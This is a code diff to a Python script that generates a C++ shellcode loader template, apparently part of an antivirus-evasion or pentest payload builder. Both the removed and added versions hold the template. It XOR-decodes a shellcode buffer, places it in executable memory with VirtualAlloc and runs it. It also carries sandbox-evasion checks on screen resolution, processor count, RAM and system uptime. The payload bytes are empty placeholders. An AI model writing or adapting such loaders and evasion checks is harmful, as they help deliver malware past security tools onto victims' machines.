@@ -29,59 +29,56 @@ def xor(data, key):
 def create_template():
     template = open("template.cpp", "w+")
     template.write(
-        r'''#include <windows.h>
-    #include <stdio.h>
-    #include <iostream>
-    #define MULTI_LINE_STRING(a) #a
-    #pragma comment(linker, "/INCREMENTAL:YES")
-    #pragma comment(lib, "user32.lib")
-    #define WIN32_LEAN_AND_MEAN
-    bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
-    {
-        MONITORINFO monitorInfo;
-        monitorInfo.cbSize = sizeof(MONITORINFO);
-        GetMonitorInfoW(hMonitor, &monitorInfo);
-        int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
-        int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
-        if (xResolution < 0) xResolution = -xResolution;
-        if (yResolution < 0) yResolution = -yResolution;
-        if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
-            || (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
+    r'''#include <windows.h>
+#include <stdio.h>
+#include <iostream>
+#define MULTI_LINE_STRING(a) #a
+#pragma comment(linker, "/INCREMENTAL:YES")
+#pragma comment(lib, "user32.lib")
+#define WIN32_LEAN_AND_MEAN
+BOOL aynenKardesim() {
+  SYSTEM_INFO inf;
+  MEMORYSTATUSEX memStat;
+  DWORD proc;
+  DWORD belleq;
+  GetSystemInfo(&inf);
+  proc = inf.dwNumberOfProcessors;
+  if (proc < 2) return false;
+  memStat.dwLength = sizeof(memStat);
+  GlobalMemoryStatusEx(&memStat);
+  belleq = memStat.ullTotalPhys / 1024 / 1024 / 1024;
+  if (belleq < 2) return false;
+  return true;
+}
+int main(int argc, char** argv)
+{
+	
+	if (aynenKardesim() == false) {
+    return -2;
+    }
+    else{
+  
+	ULONGLONG uptime = GetTickCount() / 1000;
+	if (uptime < 1200) return false;
+		
+        unsigned char buf[] = " ";
+        char key[] = " ";
+        char shellcode[sizeof buf];
+        int j = 0;
+        for (int i = 0; i < sizeof buf; i++)
         {
-            *((BOOL*)data) = true;
+            if(j == sizeof key -1 ) j = 0;
+            shellcode[i] = buf[i] ^ key[j];
+            j++;
         }
-        return true;
-    }
-    int main(int argc, char** argv)
-    {
-        MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
-        int xResolution = GetSystemMetrics(SM_CXSCREEN);
-        int yResolution = GetSystemMetrics(SM_CYSCREEN);
-        if ((xResolution < 1000 && yResolution < 1000)){
-                ExitThread(0);
-        }else{ 
-    
-        ULONGLONG uptime = GetTickCount() / 1000;
-        if (uptime < 1200) return false;
-    
-            unsigned char buf[] = " ";
-            char key[] = " ";
-            char shellcode[sizeof buf];
-            int j = 0;
-            for (int i = 0; i < sizeof buf; i++)
-            {
-                if(j == sizeof key -1 ) j = 0;
-                shellcode[i] = buf[i] ^ key[j];
-                j++;
-            }
-    
-            void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            memcpy(exec, shellcode, sizeof shellcode);
-            ((void(*)())exec)();
-            return 0;
-           }
-    }
-    ''')
+        
+        void* kardeslerpentest = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(kardeslerpentest, shellcode, sizeof shellcode);
+        ((void(*)())kardeslerpentest)();
+        return 0;
+       }
+}
+''')
     template.close()
 
 def slayer():
